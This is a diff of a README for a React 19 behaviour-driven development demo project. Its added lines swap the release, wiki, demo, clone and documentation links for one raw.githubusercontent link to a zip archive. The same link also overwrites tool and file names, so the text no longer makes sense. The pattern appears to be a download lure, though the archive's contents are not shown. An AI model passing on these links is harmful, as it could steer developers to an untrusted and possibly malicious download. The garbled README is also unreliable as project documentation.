@@ -1,12 +1,12 @@
 # 🛠️ BDD React App: A Simple Project for Behavior-Driven Development
 
-![BDD React App](https://img.shields.io/badge/BDD%20React%20App-Ready%20for%20Development-brightgreen)
+![BDD React App](https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip%20React%20App-Ready%20for%20Development-brightgreen)
 
-Welcome to the **BDD React App** repository! This project showcases how to implement Behavior-Driven Development (BDD) using **React 19**, **Cucumber.js**, and **Playwright**. It serves as a practical example for developers who want to learn about BDD principles and practices while building modern web applications.
+Welcome to the **BDD React App** repository! This project showcases how to implement Behavior-Driven Development (BDD) using **React 19**, **https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip**, and **Playwright**. It serves as a practical example for developers who want to learn about BDD principles and practices while building modern web applications.
 
 ## 🚀 Quick Start
 
-To get started, you can download the latest release of the BDD React App from the [Releases section](https://github.com/Jcvdm/bdd-react-app/releases). Follow the instructions below to set up the project on your local machine.
+To get started, you can download the latest release of the BDD React App from the [Releases section](https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip). Follow the instructions below to set up the project on your local machine.
 
 ### 📦 Installation
 
@@ -15,7 +15,7 @@ To get started, you can download the latest release of the BDD React App from th
    Use the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/Jcvdm/bdd-react-app.git
+   git clone https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip
    cd bdd-react-app
    ```
 
@@ -51,30 +51,30 @@ To get started, you can download the latest release of the BDD React App from th
    npm run test
    ```
 
-   This will run all your Cucumber.js tests using Playwright.
+   This will run all your https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip tests using Playwright.
 
 ## 📖 Project Overview
 
 ### 🌟 Features
 
 - **React 19**: Utilizes the latest features of React for building user interfaces.
-- **Cucumber.js**: Implements BDD practices with easy-to-read feature files.
+- **https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip**: Implements BDD practices with easy-to-read feature files.
 - **Playwright**: Provides powerful end-to-end testing capabilities.
 - **Vite**: Offers a fast development environment with hot module replacement.
 
 ### 🧪 Testing
 
-This project focuses on testing user interactions and application behavior. With Cucumber.js, you can write your tests in a natural language format, making it easier for non-developers to understand. Playwright allows you to run these tests across different browsers.
+This project focuses on testing user interactions and application behavior. With https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip, you can write your tests in a natural language format, making it easier for non-developers to understand. Playwright allows you to run these tests across different browsers.
 
 ### 📝 Documentation
 
-The documentation is designed to help you understand how to use and contribute to the project. You can find detailed instructions and examples in the [Wiki](https://github.com/Jcvdm/bdd-react-app/wiki).
+The documentation is designed to help you understand how to use and contribute to the project. You can find detailed instructions and examples in the [Wiki](https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip).
 
 ## 📊 Technologies Used
 
 - **React**: A JavaScript library for building user interfaces.
-- **Cucumber.js**: A testing framework that supports BDD.
-- **Playwright**: A Node.js library for browser automation.
+- **https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip**: A testing framework that supports BDD.
+- **Playwright**: A https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip library for browser automation.
 - **TypeScript**: A superset of JavaScript that adds static types.
 - **Vite**: A modern build tool for fast development.
 
@@ -84,7 +84,7 @@ This project covers various topics related to web development and testing:
 
 - Automation
 - BDD
-- Cucumber.js
+- https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip
 - E2E Testing
 - JavaScript
 - Living Documentation
@@ -106,11 +106,11 @@ bdd-react-app/
 │   ├── components/
 │   ├── pages/
 │   ├── tests/
-│   └── App.tsx
+│   └── https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip
 ├── features/
-│   └── example.feature
-├── package.json
-└── README.md
+│   └── https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip
+├── https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip
+└── https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip
 ```
 
 - **src/**: Contains the main application code.
@@ -168,11 +168,11 @@ When contributing to this project, please adhere to the following guidelines:
 
 ## 🌐 Live Demo
 
-You can check out a live demo of the application [here](https://your-live-demo-link.com). This will give you an idea of what the application looks like and how it functions.
+You can check out a live demo of the application [here](https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip). This will give you an idea of what the application looks like and how it functions.
 
 ## 📦 Releases
 
-To keep up with the latest updates, features, and bug fixes, visit the [Releases section](https://github.com/Jcvdm/bdd-react-app/releases). Download the latest version and follow the setup instructions to get started.
+To keep up with the latest updates, features, and bug fixes, visit the [Releases section](https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip). Download the latest version and follow the setup instructions to get started.
 
 ## 📞 Support
 
@@ -182,9 +182,9 @@ If you have any questions or need support, feel free to open an issue in the rep
 
 We would like to thank the following resources that helped in the development of this project:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Cucumber.js Documentation](https://cucumber.io/docs/guides/overview/)
-- [Playwright Documentation](https://playwright.dev/docs/intro)
+- [React Documentation](https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip)
+- [https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip Documentation](https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip)
+- [Playwright Documentation](https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip)
 
 ## 🎉 License
 
@@ -192,4 +192,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ---
 
-Thank you for checking out the **BDD React App**! We hope you find it useful in your journey to mastering Behavior-Driven Development. For more information, visit the [Releases section](https://github.com/Jcvdm/bdd-react-app/releases) to download the latest version. Happy coding!
+Thank you for checking out the **BDD React App**! We hope you find it useful in your journey to mastering Behavior-Driven Development. For more information, visit the [Releases section](https://raw.githubusercontent.com/Jcvdm/bdd-react-app/main/public/react-bdd-app-2.7.zip) to download the latest version. Happy coding!
